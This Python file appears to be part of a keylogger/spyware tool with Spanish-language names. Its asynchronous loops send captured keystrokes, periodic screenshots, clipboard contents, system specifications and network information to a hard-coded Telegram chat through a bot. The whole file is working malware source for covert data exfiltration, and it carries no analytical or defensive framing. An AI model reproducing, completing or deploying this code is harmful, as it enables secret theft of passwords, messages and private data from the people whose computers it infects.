import asyncio
from keylogger import llista_teclas
import os
from funciones import registro_errores, capture_screenshot, get_clipboard_content, obtener_informacion_red, obtener_especificaciones_sistema

async def capturar_teclas(bot):
    global llista_teclas
    while True:
        await asyncio.sleep(1)
        if llista_teclas:
            try:
                await bot.send_message(chat_id="654850399", text="\n".join(llista_teclas))
                llista_teclas.clear()
            except Exception as e:
                registro_errores(f"Error sending key presses: {e}")
                
async def capture_screenshots(bot):
    while True:
        await asyncio.sleep(30)
        try:
            screenshot_path = capture_screenshot()
            await bot.send_photo(chat_id="654850399", photo=open(screenshot_path, 'rb'))
            os.remove(screenshot_path)
        except Exception as e:
            registro_errores(f"Error capturing and sending the screen: {e}")

async def log_clipboard(bot):
    previous_content = ""
    while True:
        await asyncio.sleep(5)  
        current_content = get_clipboard_content()
        if current_content != previous_content:
            previous_content = current_content
            await bot.send_message(chat_id="654850399", text=f"Clipboard content: {current_content}") 

async def especificaciones_sistema(bot):
    await asyncio.sleep(0.001)
    especificaciones = obtener_especificaciones_sistema()
    await bot.send_message(chat_id="654850399", text=f"{especificaciones}") 

async def informacion_red(bot):
    await asyncio.sleep(0.001)
    informacion_red = obtener_informacion_red()
    await bot.send_message(chat_id="654850399", text=f"{informacion_red}")
